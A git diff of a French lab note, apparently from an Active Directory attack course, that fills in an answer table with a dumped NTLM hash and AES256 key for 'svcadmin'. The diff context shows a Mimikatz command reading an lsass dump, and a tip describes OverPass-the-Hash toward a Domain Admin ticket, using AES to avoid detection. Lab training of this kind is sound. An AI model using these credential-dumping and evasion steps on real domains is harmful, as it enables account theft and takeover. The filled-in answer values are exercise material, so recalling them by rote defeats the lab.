@@ -52,10 +52,10 @@ Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekey
 
 ## Réponse
 
-| Élément | Valeur |
-|---------|--------|
-| NTLM `svcadmin` (rc4_hmac) | <A REMPLIR DEPUIS LAB> |
-| AES256 `svcadmin` (aes256_hmac) | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011` |
+| Élément                             | Valeur                                                                 |
+| ----------------------------------- | ---------------------------------------------------------------------- |
+| **NTLM `svcadmin` (rc4_hmac)** ✅    | **`b38ff50264b74508085d82c69794a4d8`**                                 |
+| AES256 `svcadmin` (aes256_hmac)     | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011`     |
 
 > [!tip] La clé `aes256` alimente directement l'OverPass-the-Hash → TGT Domain Admin (cf [[LO07 - Session DA et escalade]] étape 8). Utiliser `/aes256:` plutôt que `/rc4:` (downgrade détectable).
 
